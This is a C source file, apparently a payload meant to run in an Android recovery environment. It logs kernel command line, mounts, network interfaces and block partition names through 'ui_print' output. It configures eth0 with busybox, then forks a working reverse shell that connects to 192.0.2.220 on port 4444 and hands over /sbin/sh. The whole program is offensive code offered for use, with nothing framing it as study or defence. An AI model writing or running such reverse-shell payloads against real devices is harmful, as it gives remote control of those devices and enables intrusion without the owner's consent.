#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <netinet/in.h>
#include <arpa/inet.h>

static int SFD = 1;

static void up(const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf + 9, sizeof(buf) - 10, fmt, ap);
    va_end(ap);
    if (n < 0) return;
    memcpy(buf, "ui_print ", 9);
    int len = 9 + n;
    buf[len++] = '\n';
    write(SFD, buf, len);
}

static void catfile(const char *p, int maxlines)
{
    FILE *f = fopen(p, "r");
    up("-- %s %s", p, f ? "OK" : "FAIL");
    if (!f) return;
    char b[512];
    int i = 0;
    while (fgets(b, sizeof(b), f) && i++ < maxlines) {
        char *nl = strchr(b, '\n');
        if (nl) *nl = 0;
        up("  %s", b);
    }
    fclose(f);
}

static void runsh(const char *cmd)
{
    int pfd[2];
    if (pipe(pfd) < 0) { up("pipe fail"); return; }
    pid_t pid = fork();
    if (pid == 0) {
        close(pfd[0]);
        dup2(pfd[1], 1);
        dup2(pfd[1], 2);
        close(pfd[1]);
        char *av[] = { (char *)"/sbin/sh", (char *)"-c", (char *)cmd, NULL };
        execve("/sbin/sh", av, NULL);
        _exit(127);
    }
    close(pfd[1]);
    char b[512];
    int n;
    while ((n = read(pfd[0], b, sizeof(b) - 1)) > 0) {
        b[n] = 0;
        char *r = b, *e;
        while ((e = strchr(r, '\n')) != NULL) {
            *e = 0;
            up("  %s", r);
            r = e + 1;
        }
        if (*r) up("  %s", r);
    }
    close(pfd[0]);
    int st;
    waitpid(pid, &st, 0);
    up("  [rc=%d]", WIFEXITED(st) ? WEXITSTATUS(st) : -1);
}

int main(int argc, char **argv)
{
    if (argc > 2) SFD = atoi(argv[2]);
    up("R2-START");
    catfile("/proc/cmdline", 2);
    catfile("/proc/mounts", 25);
    catfile("/proc/net/dev", 10);
    DIR *d = opendir("/dev/block/by-name");
    if (!d) d = opendir("/dev/block");
    up("-- by-name %s", d ? "OK" : "FAIL");
    if (d) {
        struct dirent *e;
        int i = 0;
        while ((e = readdir(d)) && i++ < 40)
            if (e->d_name[0] != '.') up("  %s", e->d_name);
        closedir(d);
    }
    up("-- busybox tests");
    runsh("/sbin/busybox ifconfig -a 2>&1 | head -30");
    up("-- bring up eth0");
    runsh("/sbin/busybox ifconfig eth0 192.0.2.125 netmask 255.255.255.0 up 2>&1; "
          "/sbin/busybox route add default gw 192.0.2.1 2>&1; "
          "/sbin/busybox ping -c 2 -w 4 192.0.2.220 2>&1");
    up("-- spawn reverse shell to 192.0.2.220:4444");
    pid_t pid = fork();
    if (pid == 0) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(4444);
        sa.sin_addr.s_addr = inet_addr("192.0.2.220");
        int r = connect(fd, (struct sockaddr *)&sa, sizeof(sa));
        char msg[64];
        int n = snprintf(msg, sizeof(msg), "connect rc=%d errno=%d\n", r, errno);
        write(SFD, msg, n);
        if (r == 0) {
            dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
            char *av[] = { (char *)"/sbin/sh", (char*)"-", NULL };
            execve("/sbin/sh", av, NULL);
            _exit(1);
        }
        _exit(0);
    }
    up("-- parent waiting 45s");
    sleep(45);
    up("done-marker-reached");
    write(SFD, "done\n", 5);
    return 0;
}
